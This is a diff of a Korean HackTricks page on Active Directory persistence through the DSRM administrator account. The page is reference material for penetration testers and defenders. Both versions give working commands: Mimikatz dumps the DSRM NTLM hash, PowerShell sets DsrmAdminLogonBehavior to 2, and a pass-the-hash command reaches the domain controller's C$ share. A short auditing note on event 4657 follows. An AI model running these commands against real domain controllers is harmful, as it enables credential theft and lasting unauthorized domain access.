@@ -2,34 +2,39 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic Information
+## 기본 정보
 
-각 **DC** 내부에는 **local administrator** 계정이 있습니다. 이 머신에서 admin privileges를 보유하면 mimikatz를 사용해 **local Administrator hash**를 **dump**할 수 있습니다. 그런 다음 registry를 수정하여 **이 password를 activate**하면 이 **local Administrator user**에 원격으로 access할 수 있습니다.\
-먼저 DC 내부의 **local Administrator** user의 **hash**를 **dump**해야 합니다:
-```bash
+모든 도메인 컨트롤러에는 Directory Services Restore Mode(DSRM) administrator account가 있습니다. 이 계정의 password는 도메인 컨트롤러 승격 중에 설정되며 Active Directory domain accounts와는 별개입니다.<sup>[[1]](#references)</sup>
+
+도메인 컨트롤러를 administrative control할 수 있는 attacker는 로컬 SAM database를 dump하고 DSRM Administrator NTLM hash를 복구할 수 있습니다. 다음 Mimikatz command가 해당 작업을 수행합니다:<sup>[[2]](#references)</sup>
+```powershell
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-그런 다음 해당 계정이 작동하는지 확인해야 하며, 레지스트리 키의 값이 "0"이거나 존재하지 않는 경우 **"2"로 설정해야 합니다**:
-```bash
-Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
-New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
-Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
+기본적으로 DSRM 계정은 복원 모드용으로 사용됩니다. `DsrmAdminLogonBehavior`를 `2`로 설정하면 도메인 컨트롤러가 정상적으로 실행 중일 때 이 로컬 계정으로 인증할 수 있습니다. 값을 변경하기 전에 확인합니다:<sup>[[2]](#references)[[3]](#references)</sup>
+```powershell
+$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
+$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue
+
+if ($null -eq $current) {
+New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
+} else {
+Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
+}
 ```
-그런 다음 PTH를 사용하여 **C$의 콘텐츠를 나열하거나 심지어 shell을 획득할 수 있습니다**. 해당 hash를 메모리에 저장한 상태로(PTH를 위해) 새로운 powershell 세션을 생성할 때 사용되는 **"domain"은 단지 DC machine의 이름이라는 점에 유의하세요**:
-```bash
+복구된 hash는 pass-the-hash 세션에서 관리용 `C$` share와 같은 resource에 액세스하는 데 사용할 수 있습니다. 이 local account에는 domain controller의 computer name을 `/domain` 값으로 사용합니다:<sup>[[3]](#references)</sup>
+```powershell
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
-#And in new spawned powershell you now can access via NTLM the content of C$
+# In the new PowerShell process, access C$ over NTLM.
 ls \\dc-host-name\C$
 ```
-이와 관련된 자세한 정보는 다음에서 확인할 수 있습니다: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) 및 [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>
-
 ## 완화
 
-- Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` 생성/변경 감사
+- `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`에 대한 변경 사항을 감사하세요. 키의 SACL이 **Set Value** 작업을 감사하도록 구성된 경우 보안 이벤트 4657에 레지스트리 값 수정이 기록됩니다.<sup>[[4]](#references)</sup>
 
 ## References
 
-- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
-- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)
-
+- [1] [Microsoft: Directory Services Restore Mode 관리자 암호 재설정](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
+- [2] [ADSecurity: 교묘한 Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
+- [3] [ADSecurity: 교묘한 Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
+- [4] [Microsoft: 이벤트 4657 — 레지스트리 값이 수정됨](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
 {{#include ../../banners/hacktricks-training.md}}
